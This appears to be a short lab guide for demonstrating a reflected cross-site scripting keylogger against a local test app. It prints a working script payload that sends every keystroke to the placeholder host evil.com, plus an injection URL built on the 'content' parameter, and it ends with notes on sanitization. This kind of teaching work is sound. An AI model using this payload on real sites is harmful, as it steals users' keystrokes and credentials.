Below is the markdown file content with proper formatting:

# Steps to Attempt the Keylogging XSS Attack

## Craft the Malicious Payload

The attacker’s keylogging payload is:

```html
<script>
  document.onkeypress = function(e) {
    fetch('http://evil.com/log?key=' + e.key);
  };
</script>
```

This code sets up an event handler that sends every keystroke to a remote server (in this example, evil.com).

## Inject the Payload

To simulate an attack, append the payload to the URL as the value of the `content` query parameter. For example, enter the following URL in your browser’s address bar:

```perl
http://localhost:3000/?content=<script>document.onkeypress%20=%20function(e)%20{%20fetch('http://evil.com/log?key='+e.key);%20};</script>
```

**Note:** The payload must be URL-encoded if your browser doesn’t automatically do so.

## Observe the Exploit

After loading the URL, the page will display your injected payload in the HTML. However, because the injected script is executed immediately, the keylogger is activated.

Now, any keystroke you make anywhere on the page will trigger the `document.onkeypress` event. In a real attack, each key press would send a request to `http://evil.com/log?key=...`.

For demonstration purposes, you can open your browser’s developer tools (typically via F12) and watch the Network tab to see if fetch requests are being sent. (Since the target URL in the payload is a placeholder, you may see failed requests unless you change the URL to a controlled logging server.)

## Document Your Findings

- Record what happens when you type into the input field.
- Explain how the unsanitized reflection of user input allowed the keylogging script to execute.
- Discuss the implications and how proper sanitization and output encoding could prevent such vulnerabilities.
